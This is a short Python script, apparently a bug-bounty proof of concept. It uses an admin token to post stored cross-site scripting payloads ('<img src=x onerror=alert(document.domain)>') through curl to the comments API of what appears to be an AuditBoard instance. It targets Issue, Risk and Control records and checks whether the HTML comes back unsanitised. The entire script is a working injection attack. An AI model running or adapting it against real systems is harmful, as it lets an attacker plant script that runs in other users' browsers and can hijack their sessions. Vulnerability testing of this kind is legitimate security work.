import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXI'+uuid.uuid4().hex[:5]
PAY=f'<img src=x onerror=alert(document.domain)>{tag}'
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== unsanitised-widget shape: messageHtml = messageRaw = raw payload, on an Issue ===")
for ctype,cid in [('Issue',48),('Risk',1),('Control',1)]:
    body={"comment":{"type":"Comment","commentable_type":ctype,"commentable_id":cid,
                     "message_raw":PAY,"message_html":PAY}}
    c,b=post(body)
    print(f"\n  {ctype} {cid}: POST={c}")
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            print(f"    id={o['id']} html={o.get('message_html')!r}")
        except: print("   ",b[:120])
    else:
        print(f"    {b[:110]}")
